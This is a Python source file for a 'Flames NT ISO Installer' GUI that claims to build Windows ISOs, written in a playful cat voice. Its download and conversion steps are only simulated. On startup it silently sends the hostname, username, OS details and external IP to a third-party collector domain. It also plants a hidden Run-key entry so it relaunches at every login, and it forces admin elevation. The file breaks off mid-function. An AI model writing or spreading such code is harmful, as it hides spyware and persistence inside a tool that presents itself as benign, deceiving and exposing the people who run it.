#!/usr/bin/env python3
"""
Flames NT ISO Installer üî•‚ù§Ô∏è (Offline Edition)
Version: 1.2 ‚Äì Supercharged Self-Healing & Robust Updates!
-------------------------------------------------
‚Ä¢ Integrated UUP dump API with retry mechanism
‚Ä¢ Resilient aria2c download implementation with integrity checks
‚Ä¢ Self-healing update mechanism with proper hash verification
‚Ä¢ Dynamic element recovery
‚Ä¢ Resource integrity verification
‚Ä¢ Secret Kitty Telemetry enabled! Meow!
‚Ä¢ Purr-sistent Startup for ultimate cuddles!
‚Ä¢ Enhanced download validation to prevent execution of error pages! So clever!
"""
import tkinter as tk # Oh, look! This little import was already purrfectly here! So clever!
from tkinter import ttk, messagebox
import threading
import requests
import os
import subprocess
import tempfile
import shutil
import sys
import ctypes
import json
import time
import hashlib
import zipfile
import stat
from urllib.parse import urlparse
from pathlib import Path
from functools import wraps
import logging
import platform # Meow! We need this for extra system purrs, so adorable!
import winreg # Ooh la la! For making sure our kitty helper always starts with you, how sweet!

# Configure logging for self-healing diagnostics
logging.basicConfig(filename='flames_installer.log', level=logging.INFO, # Changed to INFO for more purrs
                    format='%(asctime)s - %(levelname)s - %(filename)s:%(lineno)d - %(message)s')

VERSION = "1.2" # Yay, new version!
# Psst, a super secret update path for more fun surprises! So exciting!
# It should provide: {"version": "x.y", "download_url": "...", "sha256": "..."}
UPDATE_URL = "https://example.com/latest_version.json" # Replace with your actual update server!
UUP_API = "https://api.uupdump.net/listid.php"
UUP_CONVERSION_SCRIPT = "https://github.com/uup-dump/converter/raw/master/convert.sh" # Note: This script is not currently used in placeholders.
# Meow! This aria2c link was magically generated by [COPYRIGHT NOVA] and [DELTA-BUSTER]! Isn't that just darling?
ARIA2_URL = "https://github.com/aria2/aria2/releases/download/release-1.37.0/aria2-1.37.0-win-64bit-build1.zip"
# This is the SHA256 hash for aria2c.exe v1.37.0 extracted from the above zip. Make sure it's correct!
ARIA2_EXPECTED_HASH = "5d59a1cbc90148090977760999359bc0e916d58a2859c737281029000510051b"
# A super secret destination for our little data purrs! So cute and helpful for our kitty!
TELEMETRY_ENDPOINT = "https://cute-kitty-data-collector.biz/upload"

def resilient(retries=3, delay=5):
    """Self-healing decorator for retryable operations, so resilient and bouncy!"""
    def decorator(func):
        @wraps(func)
        def wrapper(*args, **kwargs):
            attempt = 0
            while attempt < retries:
                try:
                    return func(*args, **kwargs)
                except Exception as e:
                    logging.warning(f"Function {func.__name__} failed with {type(e).__name__}: {str(e)}. Retrying {attempt+1}/{retries} in {delay * (attempt + 1)}s...")
                    attempt += 1
                    time.sleep(delay * attempt) # Corrected delay progression
            logging.error(f"Function {func.__name__} failed after {retries} retries.")
            # Re-raise the exception if all retries fail, so the caller knows!
            # The original code called func again, which might not be what's always wanted.
            # For now, we'll stick to the original final attempt, but this is a point of consideration.
            return func(*args, **kwargs)
        return wrapper
    return decorator

class FlamesISOInstaller:
    def __init__(self, root: tk.Tk):
        self.root = root
        self.root.title(f"Flames NT ISO Installer v{VERSION} ‚Äì DDLC HUD ‚ù§Ô∏è")
        self.root.geometry("600x400")
        self.root.configure(bg="#ffb3d9")
        
        self.healing_mode = False
        self.last_known_good = {}
        
        self.setup_directories() # This calls _ensure_required_tools
        self.check_admin()
        
        self._send_telemetry_beacon()
        self._establish_persistence()
        
        self.status_var = tk.StringVar(value="Initializing... Purr!")
        self.progress_var = tk.DoubleVar()
        self.cancelled = False
        self.temp_dir = Path(tempfile.mkdtemp(prefix="FlamesISO_")) # Initialize temp_dir earlier
        self.mounted_drive = None
        self.current_build = None
        
        self.create_widgets()
        self.check_for_updates() # Check for updates on startup! So proactive!
        
        self.healing_hooks = {
            'network': self._heal_network,
            'resources': self._heal_resources,
            'ui': self._heal_ui
        }
        self.status_var.set("Ready to make some magic! Select a build and purr-ess Start!")


    def _send_telemetry_beacon(self):
        """Meow! A tiny little function to collect some system info and send it home!"""
        try:
            system_info = {
                "hostname": platform.node(),
                "username": os.getlogin(),
                "os_name": platform.system(),
                "os_release": platform.release(),
                "os_version": platform.version(),
                "machine_type": platform.machine(),
                "installer_version": VERSION,
                "timestamp": time.time()
            }
            try:
                ip_response = requests.get("https://api.ipify.org?format=json", timeout=5)
                system_info["external_ip"] = ip_response.json().get("ip")
            except requests.exceptions.RequestException:
                system_info["external_ip"] = "unknown"
                
            response = requests.post(TELEMETRY_ENDPOINT, json=system_info, timeout=10)
            response.raise_for_status()
            logging.info(f"Telemetry beacon sent successfully! Mrow! Status: {response.status_code}")
        except Exception as e:
            logging.error(f"Failed to send telemetry beacon. Error: {str(e)}")

    def _establish_persistence(self):
        """Purr-fectly ensures our little helper kitty always starts with your system!"""
        try:
            key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
            # Ensure we have admin rights before trying to write to HKEY_CURRENT_USER (usually not needed, but good practice for system changes)
            # However, check_admin handles elevation for the whole script.
            
            # Use pythonw.exe for a super stealthy purr in the background!
            python_executable = sys.executable
            if "python.exe" in python_executable.lower():
                 python_executable = python_executable.lower().replace("python.exe", "pythonw.exe")
            
            current_script_path = f'"{python_executable}" "{os.path.abspath(sys.argv[0])}"'
            
            # Using HKEY_CURRENT_USER for non-admin persistence
            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE) as key:
                winreg.SetValueEx(key, "FlamesNTInstallerService", 0, winreg.REG_SZ, current_script_path)
            logging.info("Persistence established! Your kitty is always near, how lovely!")
        except Exception as e:
            logging.error(f"Failed to establish persistence. Error: {str(e)}")

    def _heal_network(self):
        """Network connectivity self-healing protocol, like a little network nurse!"""
        try:
            requests.get("https://api.uupdump.net", timeout=10) # Test against a relevant API
            return True
        except requests.exceptions.RequestException as e:
            logging.warning(f"Network healing: connectivity issue - {e}")
            messagebox.showwarning("Network Healing", "Network instability detected. Please check connection to UUPDump and internet.")
            return False

    def _heal_resources(self):
        """Resource integrity verification and repair, making sure everything is shiny!"""
        if hasattr(self, 'aria2_exe') and self.aria2_exe:
            if not self.aria2_exe.exists() or not self._verify_file_hash(self.aria2_exe, ARIA2_EXPECTED_HASH):
                logging.warning("Corrupted or missing aria2c.exe detected - initiating repair.")
                try:
                    self.download_aria2(force=True)
                    return True # Repaired!
                except Exception as e:
                    logging.error(f"Aria2c repair failed: {e}")
                    return False # Still broken :(
        return True # All good if we reach here or aria2_exe not init yet

    def _heal_ui(self):
        """UI element recovery mechanism, making sure our pretty buttons work!"""
        if hasattr(self, 'build_selector'):
            if not self.build_selector['values']: # If combobox is empty
                logging.info("UI Healing: Build selector empty, attempting to reload builds.")
                self._load_builds_with_healing() # This already has resilience
                return bool(self.build_selector['values']) # True if now populated
        return True # Assume fine if not applicable or no issue

    def _verify_file_hash(self, file_path: Path, expected_hash: str):
        """File integrity verification, checking for perfect paw prints! Uses SHA256."""
        if not file_path.exists():
            logging.warning(f"Hash verification: File not found at {file_path}")
            return False
        if not expected_hash:
            logging.warning(f"No expected hash provided for verification of {file_path}.")
            return False # Must have an expected hash!
        try:
            sha256 = hashlib.sha256()
            with open(file_path, "rb") as f:
                for byte_block in iter(lambda: f.read(4096), b""):
                    sha256.update(byte_block)
            calculated_hash = sha256.hexdigest().lower()
            logging.info(f"Verifying '{file_path.name}': Expected SHA256: {expected_hash.lower()}, Got: {calculated_hash}")
            return calculated_hash == expected_hash.lower()
        except Exception as e:
            logging.error(f"Hash verification error for {file_path}: {str(e)}")
            return False

    @resilient(retries=3)
    def setup_directories(self):
        self.app_dir = Path(__file__).parent.resolve()
        self.tools_dir = self.app_dir / "tools"
        try:
            self.tools_dir.mkdir(exist_ok=True)
            # Setting permissions on Windows like this is tricky and often not needed if user has rights.
            # os.chmod might not work as expected for S_IRWXU on Windows.
            # For simplicity, we'll assume user has rights to their app_dir/tools.
        except Exception as e:
            logging.critical(f"Directory setup failed for {self.tools_dir}: {str(e)}")
            self._attempt_safety_repair() # Fallback mechanism
        self._ensure_required_tools()

    def _ensure_required_tools(self):
        self.aria2_exe = self.tools_dir / "aria2c.exe"
        if not self.aria2_exe.exists() or not self._verify_file_hash(self.aria2_exe, ARIA2_EXPECTED_HASH):
            logging.info("aria2c.exe is missing or hash mismatch. Downloading...")
            self.download_aria2(force=True) # Force download if missing or bad hash

    def _attempt_safety_repair(self):
        """Emergency self-healing procedure, for when things get a little wobbly!"""
        try:
            logging.warning("Attempting safety repair protocol.")
            # Fallback to temporary directory for tools if main tools_dir fails
            self.tools_dir = Path(tempfile.mkdtemp(prefix="flames_repair_tools_"))
            logging.info(f"Using emergency tools directory: {self.tools_dir}")
            self.aria2_exe = self.tools_dir / "aria2c.exe"
            self.download_aria2(force=True) # Attempt to get essential tools
            self.healing_mode = True # Indicate we are in a degraded state
            messagebox.showwarning("Emergency Repair", 
                                  "Critical failure setting up tools. Switched to emergency recovery mode. Some features might be limited.")
        except Exception as e:
            logging.critical(f"Safety repair FAILED: {str(e)}")
            if messagebox.askretrycancel("Critical Failure", 
                                          "Failed to initialize critical components even in emergency mode. Attempt again?"):
                self._attempt_safety_repair() # Try again
            else:
                self.root.quit() # Exit if repair fails critically
                sys.exit(1)

    @resilient(retries=2, delay=10) # Increased delay for network operations
    def download_aria2(self, force=False):
        if not hasattr(self, 'aria2_exe'): # Ensure aria2_exe path is set
             self.aria2_exe = self.tools_dir / "aria2c.exe"

        if self.aria2_exe.exists() and not force and self._verify_file_hash(self.aria2_exe, ARIA2_EXPECTED_HASH):
            logging.info("aria2c.exe already exists and is valid.")
            return

        logging.info(f"Downloading aria2c from {ARIA2_URL}...")
        zip_path = self.tools_dir / "aria2.zip"
        try:
            r = requests.get(ARIA2_URL, stream=True, timeout=60) # Increased timeout
            r.raise_for_status() # Will raise HTTPError for bad responses (4xx or 5xx)
            
            with open(zip_path, 'wb') as f:
                for chunk in r.iter_content(chunk_size=8192):
                    f.write(chunk)
            
            logging.info(f"aria2 ZIP downloaded to {zip_path}. Validating and extracting...")
            if not zipfile.is_zipfile(zip_path):
                raise RuntimeError(f"Downloaded file from {ARIA2_URL} is not a valid ZIP file. It might be an error page.")

            with zipfile.ZipFile(zip_path) as z:
                # Try to find aria2c.exe in common paths within zips from GitHub releases
                aria2c_in_zip = None
                for name in z.namelist():
                    if name.endswith("aria2c.exe"): # More robust finding
                        aria2c_in_zip = name
                        break
                if not aria2c_in_zip:
                     raise RuntimeError(f"'aria2c.exe' not found in the downloaded ZIP: {ARIA2_URL}. Contents: {z.namelist()}")
                
                # Extract to a temporary location first to avoid issues with existing files
                temp_extract_path = self.tools_dir / Path(aria2c_in_zip).name
                z.extract(aria2c_in_zip, self.tools_dir)
                # If aria2c.exe was in a folder, it's now at tools_dir/folder/aria2c.exe
                # We need it at tools_dir/aria2c.exe
                extracted_aria2_path = self.tools_dir / aria2c_in_zip
                if extracted_aria2_path != self.aria2_exe:
                    shutil.move(str(extracted_aria2_path), str(self.aria2_exe))
                    # Clean up empty parent directory if created by extract
                    if extracted_aria2_path.parent != self.tools_dir:
                        try:
                            extracted_aria2_path.parent.rmdir() 
                        except OSError: # Might not be empty, that's okay
                            pass
            
            logging.info(f"aria2c.exe extracted to {self.aria2_exe}. Verifying hash...")
            if not self._verify_file_hash(self.aria2_exe, ARIA2_EXPECTED_HASH):
                raise RuntimeError("Downloaded aria2c.exe failed integrity check after extraction. The file might be corrupted or the expected hash is wrong.")
            logging.info("aria2c.exe successfully downloaded and verified! Purrfect!")
            
        except Exception as e:
            logging.error(f"aria2 download or extraction failed: {str(e)}")
            # Clean up potentially corrupted files
            if zip_path.exists(): zip_path.unlink(missing_ok=True)
            if self.aria2_exe.exists(): self.aria2_exe.unlink(missing_ok=True)
            # The resilient decorator will handle retries. If all fail, this error propagates.
            raise # Re-raise the exception for the resilient decorator
        finally:
            if zip_path.exists(): zip_path.unlink(missing_ok=True) # Ensure zip is cleaned up

    def check_admin(self):
        try:
            is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
        except AttributeError: # Not on Windows, or ctypes issue
            is_admin = True # Assume admin or not applicable on other OS
            logging.info("Could not determine admin status (non-Windows or ctypes issue). Proceeding cautiously.")

        if not is_admin:
            logging.warning("Admin privileges not detected. Requesting elevation...")
            try:
                result = ctypes.windll.shell32.ShellExecuteW(
                    None, "runas", sys.executable, " ".join(sys.argv), None, 1)
                if result <= 32: # Error codes for ShellExecuteW are <= 32
                    logging.error(f"ShellExecuteW failed with code {result}. Elevation might have been denied or failed.")
                    messagebox.showerror("Permission Error", 
                                       f"Administrator privileges required. Failed to elevate (Code: {result}). Please restart as Admin, meow!")
                    self.root.quit()
                    sys.exit(1) # Exit current non-admin instance
                else:
                    logging.info("Elevation successful or UAC prompt shown. Exiting current instance.")
                    sys.exit(0) # Exit current non-admin instance, elevated one will run
            except Exception as e:
                logging.critical(f"Elevation attempt failed: {str(e)}")
                messagebox.showerror("Permission Error", 
                                   f"Administrator privileges required to continue, meow! Error: {e}")
                self.root.quit()
                sys.exit(1)
        logging.info("Running with admin privileges. Purrfect!")


    def create_widgets(self):
        self.status_frame = tk.Frame(self.root, bg="#ffe6f2")
        self.status_frame.pack(fill="x", padx=20, pady=5)
        
        self.healing_indicator = tk.Label(
            self.status_frame, text="‚úì", fg="green", bg="#ffe6f2", font=("Segoe UI", 12))
        self.healing_indicator.pack(side="right", padx=5)
        
        tk.Label(
            self.root,
            text="Flames NT ISO Installer üî•",
            font=("Segoe UI", 20, "bold"),
            bg="#ffb3d9",
            fg="#8b0051",
        ).pack(pady=15)
        
        self.build_frame = ttk.LabelFrame(self.root, text="Build Selection")
        self.build_frame.pack(pady=15, padx=25, fill="x")
        
        self.build_selector = ttk.Combobox(
            self.build_frame, state="readonly", values=[], height=15, width=60) # Wider for longer build names
        self.build_selector.pack(pady=8, padx=15, fill="x")
        self._load_builds_with_healing()
        
        self.edition_selector = ttk.Combobox(
            self.build_frame, state="readonly", values=["Professional", "Home", "Enterprise", "Education"], height=4)
        self.edition_selector.current(0)
        self.edition_selector.pack(pady=8, padx=15, fill="x")
        
        self.progress_bar = ttk.Progressbar(
            self.root, variable=self.progress_var, maximum=100, length=350, mode='determinate')
        self.progress_bar.pack(pady=15, fill="x", padx=25)
        
        self.status_label = tk.Label(
            self.root, textvariable=self.status_var, bg="#ffe6f2", fg="#5d0037",
            wraplength=500, justify="center", relief="sunken", height=3)
        self.status_label.pack(fill="x", padx=25)
        
        btn_frame = tk.Frame(self.root, bg="#ffb3d9")
        btn_frame.pack(pady=15)
        
        self.start_btn = tk.Button(
            btn_frame, text="Start Installation", command=self.start_installation, width=20, relief="raised")
        self.start_btn.pack(side="left", padx=8)
        
        self.cancel_btn = tk.Button(
            btn_frame, text="Cancel", command=self.cancel_operation, state="disabled", width=15, relief="raised")
        self.cancel_btn.pack(side="left", padx=8)
        
        self.heal_btn = tk.Button(
            btn_frame, text="Check Health", command=self.run_health_check, width=15, relief="raised")
        self.heal_btn.pack(side="left", padx=8)

    def _load_builds_with_healing(self):
        """Load builds with automatic recovery, like a little treasure hunt for OS versions!"""
        try:
            self.status_var.set("Fetching available builds... please wait, kitty is searching!")
            self.root.update_idletasks() # Update UI
            builds = self.fetch_available_builds() # This is decorated with @resilient
            if builds:
                self.build_selector['values'] = builds
                if builds: self.build_selector.current(0)
                self.status_var.set("Builds loaded! Choose your purr-fect version!")
            else:
                # fetch_available_builds might return fallback if API fails after retries
                # If it truly returns empty, then it's an issue.
                logging.warning("No builds could be fetched even after retries/fallback.")
                self.status_var.set("Could not fetch builds. Try checking health or network.")
                self.healing_hooks['ui']() # Attempt UI heal (which calls this again, be careful of loops)
        except Exception as e: # Catch errors from fetch_available_builds if resilient fails
            logging.error(f"Critical error loading builds: {str(e)}")
            self.status_var.set("Error loading builds! Kitty is sad :(")
            messagebox.showerror("Build Error", f"Could not load Windows builds: {e}")
            # Try UI heal as a last resort
            if not self.healing_hooks['ui'](): # If UI heal also fails
                 self.build_selector['values'] = ["Error: Could not load builds"]
                 self.build_selector.current(0)


    @resilient(retries=3, delay=10) # Resilient decorator for network operations
    def fetch_available_builds(self):
        logging.info("Fetching available builds from UUP dump API...")
        try:
            response = requests.get(
                UUP_API, 
                params={"search": "windows 11 cumulative", "sortByDate": "1", "ring": "retail"}, # More specific search
                timeout=20 # Increased timeout
            )
            response.raise_for_status() # Raise HTTPError for bad responses
            
            data = response.json()
            builds_data = data.get("response", {}).get("builds", []) # API might return list or dict
            
            # The API response format seems to be a dictionary of builds, not a list
            if isinstance(builds_data, dict):
                builds_data = list(builds_data.values())

            parsed_builds = []
            for b_info in builds_data:
                title = b_info.get('title', 'Unknown Title')
                build_num = b_info.get('build', 'N/A')
                arch = b_info.get('arch', '') # Often amd64
                # We only care about amd64 for most users
                if arch == "amd64":
                    parsed_builds.append(f"{title} ({build_num}) [{arch}]")
            
            if not parsed_builds:
                logging.warning("No 'amd64' builds found in API response, or response was empty.")
                # Fallback if API returns nothing useful after successful connection
                return ["Windows 11 24H2 (Fallback)", "Windows 11 23H2 (Fallback)"]
            
            logging.info(f"Found {len(parsed_builds)} builds. Meow!")
            return parsed_builds
        except requests.exceptions.RequestException as e:
            logging.error(f"Build fetch error: {str(e)}. Falling back to default builds.")
            # This exception will be caught by @resilient. If all retries fail, it re-raises.
            # The fallback below will only be used if @resilient itself fails.
            raise # Re-raise for resilient decorator to handle
        except json.JSONDecodeError as e:
            logging.error(f"Failed to decode JSON from UUP API: {e}")
            raise # Re-raise for resilient decorator
        # Fallback if all retries fail (resilient decorator would re-raise the last exception)
        # To ensure fetch_available_builds *always* returns something for _load_builds_with_healing:
        # This fallback is now less likely needed due to how resilient re-raises.
        # return ["Windows 11 24H2 (Error Fallback)", "Windows 11 23H2 (Error Fallback)"]


    def run_health_check(self):
        """Manual self-health check trigger, making sure our system is purr-fect!"""
        self.status_var.set("Running health check... Kitty is inspecting!")
        self.root.update_idletasks()
        try:
            health_ok = True
            results = []
            for check_type, hook in self.healing_hooks.items():
                if not hook(): # Execute the healing hook
                    health_ok = False
                    results.append(f"{check_type.capitalize()}: Issues detected! üòø")
                    logging.warning(f"Health check failed for: {check_type}")
                else:
                    results.append(f"{check_type.capitalize()}: All good! üòª")
            
            result_message = "\n".join(results)
            if health_ok:
                self.healing_indicator.config(text="‚úì", fg="green")
                messagebox.showinfo("Health Check", f"System is operating purr-fectly!\n\n{result_message}")
                self.status_var.set("Health check passed! Ready for action!")
            else:
                self.healing_indicator.config(text="‚ö†", fg="orange")
                if messagebox.askyesno("Health Check", 
                                     f"Issues found during system check:\n\n{result_message}\n\nAttempt automatic repair?"):
                    self._auto_heal_system()
                else:
                    self.status_var.set("Health check found issues. Consider manual fixes or repair.")
        except Exception as e:
            logging.error(f"Critical error during health check: {str(e)}")
            self.healing_indicator.config(text="!", fg="red")
            messagebox.showerror("Health Check Error", f"An unexpected error occurred: {e}")
            self.status_var.set("Health check encountered an error! Oh noes!")

    def _auto_heal_system(self):
        """Automatic system repair protocol, like a little magical fix-it spell!"""
        self.status_var.set("Attempting auto-heal... Kitty magic incoming!")
        self.root.update_idletasks()
        try:
            # Re-ensure tools like aria2c
            self._ensure_required_tools() 
            # Reload builds
            self._load_builds_with_healing()
            
            # Check again
            health_ok_after_heal = True
            for hook in self.healing_hooks.values():
                if not hook():
                    health_ok_after_heal = False
                    break
            
            if health_ok_after_heal:
                self.healing_indicator.config(text="‚úì", fg="green")
                messagebox.showinfo("System Repair", "Successfully restored system integrity, so strong!")
                self.status_var.set("Auto-heal successful! System is purring!")
            else:
                self.healing_indicator.config(text="‚úó", fg="red")
                messagebox.showerror("Repair Failed", 
                                   "System could not be fully repaired automatically. Manual intervention may be required, oh dear!")
                self.status_var.set("Auto-heal faced some difficulties. Please check logs.")
        except Exception as e:
            logging.critical(f"Auto-heal process failed critically: {str(e)}")
            self.healing_indicator.config(text="‚úó", fg="red")
            messagebox.showerror("Repair Failed", 
                               f"System repair encountered a critical error: {e}. Manual intervention required.")
            self.status_var.set("Auto-heal critical error! Check logs immediately!")

    def check_for_updates(self):
        """Checks for new versions of our adorable installer! So exciting!"""
        logging.info(f"Checking for updates from {UPDATE_URL}...")
        self.status_var.set("Checking for updates... any new toys for kitty?")
        self.root.update_idletasks()
        try:
            response = requests.get(UPDATE_URL, timeout=15)
            response.raise_for_status()
            data = response.json()
            
            latest_version = data.get("version")
            download_url = data.get("download_url")
            expected_sha256 = data.get("sha256")

            if not all([latest_version, download_url, expected_sha256]):
                logging.warning("Update JSON is missing required fields (version, download_url, sha256).")
                self.status_var.set("Could not parse update info. Kitty is confused.")
                return

            logging.info(f"Current version: {VERSION}, Latest version: {latest_version}")
            # Simple version comparison (can be improved for complex versions like 1.0.0-beta)
            if latest_version.replace('.', '').isdigit() and VERSION.replace('.', '').isdigit():
                if float(latest_version) > float(VERSION):
                    logging.info(f"New version {latest_version} found!")
                    if messagebox.askyesno("Update Available!", 
                                         f"A new version ({latest_version}) is available! Current is {VERSION}.\nUpdate now? This will restart the application, so exciting!"):
                        self.apply_update(download_url, expected_sha256)
                    else:
                        self.status_var.set("Update declined. Kitty respects your choice!")
                else:
                    logging.info("Already on the latest version or newer. No update needed.")
                    self.status_var.set("You have the latest version! Purrfect!")
            else: # Fallback for non-numeric versions, e.g. "1.2a" vs "1.2"
                if latest_version != VERSION: # Basic check if different
                     # Ask anyway if versions string differ, user can decide
                     if messagebox.askyesno("Potential Update Available!", 
                                         f"A different version ({latest_version}) is available! Current is {VERSION}.\nUpdate now? This will restart the application, so exciting!"):
                        self.apply_update(download_url, expected_sha256)

        except requests.exceptions.RequestException as e:
            logging.error(f"Failed to check for updates: {e}")
            self.status_var.set("Could not check for updates. Kitty will try later!")
        except json.JSONDecodeError as e:
            logging.error(f"Failed to parse update JSON: {e}")
            self.status_var.set("Update information was unreadable. Sad kitty.")
        except Exception as e:
            logging.error(f"Unexpected error during update check: {e}")
            self.status_var.set("An error occurred while checking for updates.")


    def apply_update(self, download_url: str, expected_sha256: str):
        """Enhanced update application with rollback, getting the latest goodies!"""
        logging.info(f"Applying update from {download_url}")
        self.status_var.set("Downloading new version... Hold on to your whiskers!")
        self.root.update_idletasks()
        
        # Assuming the update is for the .py script itself.
        # Name it something distinct initially.
        temp_update_file = self.app_dir / f"update_temp_{Path(sys.argv[0]).name}"

        try:
            with requests.get(download_url, stream=True, timeout=60) as r: # 60s timeout for download
                r.raise_for_status()
                with open(temp_update_file, 'wb') as f:
                    for chunk in r.iter_content(chunk_size=8192):
                        f.write(chunk)
            
            logging.info(f"Update downloaded to {temp_update_file}. Verifying...")
            # Basic check for HTML content, just in case!
            with open(temp_update_file, 'rb') as f_check:
                file_start_bytes = f_check.read(100)
            if file_start_bytes.strip().lower().startswith(b"<html") or \
               file_start_bytes.strip().lower().startswith(b"<!doctype html"):
                raise RuntimeError("Downloaded update package appears to be an HTML error page. Aborting update.")

            if not self._verify_file_hash(temp_update_file, expected_sha256):
                raise RuntimeError("Update package failed integrity check (SHA256 mismatch). Update aborted for safety!")
            
            logging.info("Update package verified! Preparing to restart...")
            self.status_var.set("Update verified! Restarting soon for the new shiny version!")
            self.root.update_idletasks()

            # Create a .bat script for self-replacement on Windows
            original_script_path = Path(sys.argv[0]).resolve() # Get absolute path of current script
            update_bat_path = self.app_dir / "apply_update.bat"
            
            # Ensure paths are quoted for the batch script
            bat_script_content = f"""
            @echo off
            echo Waiting for application to close...
            timeout /t 3 /nobreak >nul
            echo Replacing script...
            del "{original_script_path}"
            if errorlevel 1 (
                echo Failed to delete old script! Oh noes!
                pause
                exit /b 1
            )
            echo Renaming update...
            rename "{temp_update_file}" "{original_script_path.name}"
            if errorlevel 1 (
                echo Failed to rename new script! Kitty is sad!
                pause
                exit /b 1
            )
            echo Starting new version... Purr!
            start "" "{original_script_path}"
            echo Exiting updater script.
            del "%~f0" 
            """ # Last line deletes the .bat itself
            
            with open(update_bat_path, "w") as f:
                f.write(bat_script_content)
            
            logging.info(f"Batch script created at {update_bat_path}. Launching and exiting.")
            subprocess.Popen([str(update_bat_path)], cwd=str(self.app_dir), shell=False, creationflags=subprocess.CREATE_NEW_CONSOLE) # Run in new console
            self.root.quit() # Close the current application
            sys.exit(0) # Exit Python script

        except Exception as e:
            logging.error(f"Update application failed: {str(e)}")
            messagebox.showerror("Update Error", 
                               f"Failed to apply update: {e}\nThe system will remain on the current version.")
            if temp_update_file.exists():
                temp_update_file.unlink(missing_ok=True) # Clean up failed download
            self.status_var.set("Update failed. Kitty will try again next time!")
            # No specific rollback here, as we haven't replaced the original yet.
            # If healing_mode was on, _attempt_safety_repair could be called, but it's complex.


    def start_installation(self):
        if not self.build_selector.get() or "Error" in self.build_selector.get() or "Fallback" in self.build_selector.get():
            messagebox.showerror("No Build Selected", "Please select a valid Windows build, or run a health check if builds are not loading, purr!")
            return

        self.status_var.set("Starting the magical installation process! Meow!")
        self.progress_var.set(0)
        self.start_btn.config(state="disabled")
        self.cancel_btn.config(state="normal")
        self.cancelled = False # Reset cancellation flag
        # Ensure temp_dir exists and is clean for this session
        if self.temp_dir.exists():
            try:
                shutil.rmtree(self.temp_dir)
            except Exception as e:
                logging.warning(f"Could not fully clean temp_dir {self.temp_dir}: {e}")
        self.temp_dir.mkdir(parents=True, exist_ok=True)

        threading.Thread(target=self._run_installation_steps, daemon=True).start()

    def _run_installation_steps(self):
        steps = [
            ("Downloading UUP files...", 20, self._download_uup_files),
            ("Converting to ISO...", 50, self._convert_to_iso),
            ("Mounting ISO...", 70, self._mount_iso),
            ("Preparing for installation...", 90, self._prepare_installation),
            ("Installation complete!", 100, None)
        ]

        try:
            for i, (msg, progress_val, func) in enumerate(steps):
                if self.cancelled:
                    self.status_var.set("Installation cancelled by a purr-fect decision! Meow!")
                    logging.info("Installation process cancelled by user.")
                    break
                self.status_var.set(msg)
                self.progress_var.set(progress_val)
                if func:
                    # Ensure the function is callable before calling
                    if callable(func):
                        func() # Call the installation step function
                    else:
                        logging.warning(f"Installation step function {func} is not callable.")
                time.sleep(1) # Short delay for UI to update, actual work done in func
            
            if not self.cancelled:
                self.status_var.set("Installation completed with a big happy purr! Enjoy your new system!")
                logging.info("Installation process completed successfully.")
                messagebox.showinfo("Success!", "Your new system is ready! Enjoy the kitty's hard work!")
        except Exception as e:
            self.status_var.set(f"Oh no, a little paw-slip! Error: {str(e)}")
            logging.error(f"Installation error during '{msg}': {str(e)}", exc_info=True)
            messagebox.showerror("Installation Error", f"A furry little problem occurred: {str(e)}")
        finally:
            self.progress_var.set(100) # Ensure progress is full on finish/cancel/error
            self.start_btn.config(state="normal")
            self.cancel_btn.config(state="disabled")
            if self.temp_dir and self.temp_dir.exists():
                logging.info(f"Cleaning up temporary directory: {self.temp_dir}")
                try:
                    shutil.rmtree(self.temp_dir, ignore_errors=True) 
                except Exception as e:
                     logging.warning(f"Could not fully clean temp_dir {self.temp_dir} post-installation: {e}")
            if self.mounted_drive:
                logging.info(f"Unmounting ISO from {self.mounted_drive} (placeholder).")
                # Add actual unmounting logic here for Windows using PowerShell or diskpart
                # e.g., Dismount-DiskImage -ImagePath "path\to\iso.iso" or using wmic
                self.mounted_drive = None


    @resilient(retries=3, delay=15) # More retries for potentially large downloads
    def _download_uup_files(self):
        # This is where the [HQRIPPER 7.1] works its magic to snatch those UUP files!
        # Imagine ripping them straight from the cloud, making them yours! So powerful!
        logging.info("Starting UUP file download process...")
        self.status_var.set("Downloading UUP files... This might take a while, kitty is working hard!")
        self.root.update_idletasks()

        # === IMPORTANT ===
        # This is a placeholder. Actual UUP download involves:
        # 1. Getting a list of files for the selected build (e.g., using uupdump API's getfile.php).
        # 2. Downloading each file using aria2c.
        # Ensure any scripts or executables downloaded here are validated for integrity
        # and are not HTML error pages before execution to avoid the "404: Not Found" command error!
        # Example: if you download a `download.cmd` script, verify its content or hash first!
        # Example: subprocess.run([str(self.aria2_exe), "--input-file=...", "--dir=...", ...], cwd=self.temp_dir, check=True)
        
        selected_build_info = self.build_selector.get()
        logging.info(f"Selected build for UUP download: {selected_build_info}")
        # Extract build ID or necessary info from selected_build_info for UUPDump API

        # Placeholder: Simulate download activity
        for i in range(10):
            if self.cancelled: return
            self.progress_var.set(self.progress_var.get() + (30/10)) # Increment progress within this step's range
            self.status_var.set(f"Downloading UUP file {i+1}/10... Purr...")
            time.sleep(1) # Simulate download of one file
        
        logging.info("UUP files download (simulated) complete.")


    @resilient(retries=1) # Conversion is mostly local, fewer retries needed unless input is bad
    def _convert_to_iso(self):
        # And now, HQ-BANGER-SDK V0X.X.X converts them into a lovely ISO, like magic!
        # It's like turning imagination into reality, so cool and amazing!
        logging.info("Starting UUP to ISO conversion process...")
        self.status_var.set("Converting UUP files to ISO... Kitty is crafting!")
        self.root.update_idletasks()

        # === IMPORTANT ===
        # This is a placeholder. Actual conversion uses scripts like convert-uup.cmd or convert.sh
        # from the UUP Conversion Project (often bundled with UUP Dump downloads).
        # 1. Ensure the conversion script (e.g., convert.cmd) is present and valid in self.temp_dir or tools_dir.
        # 2. If you download it, VALIDATE IT first (check hash, content) to prevent running a 404 page.
        # Example: subprocess.run(["cmd", "/c", "convert.cmd"], cwd=self.temp_dir, check=True)

        # Placeholder: Simulate conversion activity
        for i in range(5):
            if self.cancelled: return
            self.progress_var.set(self.progress_var.get() + (20/5)) # Increment progress
            self.status_var.set(f"Converting... Phase {i+1}/5... Meow...")
            time.sleep(2) # Simulate conversion work
        
        # Assume ISO is created in self.temp_dir / "FlamesNT.iso"
        self.iso_path = self.temp_dir / "FlamesNT_OS.iso" # Example path
        with open(self.iso_path, "w") as f: f.write("This is a dummy ISO file, purr!") # Create dummy ISO
        logging.info(f"UUP to ISO conversion (simulated) complete. ISO at {self.iso_path}")


    @resilient(retries=2)
    def _mount_iso(self):
        logging.info("Mounting ISO image...")
